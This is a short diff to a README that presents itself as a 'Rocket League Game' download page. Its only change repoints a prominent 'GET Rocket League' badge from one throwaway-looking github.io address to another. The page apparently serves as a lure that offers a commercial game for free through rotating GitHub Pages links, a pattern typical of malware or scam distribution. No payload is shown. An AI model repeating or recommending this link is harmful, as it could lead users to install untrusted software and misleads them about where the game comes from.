@@ -1,6 +1,6 @@
 # Rocket League Game - Competitive Car Soccer Game
 
-[![GET Rocket League](https://img.shields.io/badge/GET%20%E2%80%94%20Rocket%20League-0078D6?style=for-the-badge&logoColor=white)](https://kingsleytuckerugpv.github.io/.github/rocket-league-game)
+[![GET Rocket League](https://img.shields.io/badge/GET%20%E2%80%94%20Rocket%20League-0078D6?style=for-the-badge&logoColor=white)](https://zaydenyatesemlt.github.io/.github/rocket-league-game)
 
 ## Inside the Rocket League Arena
 
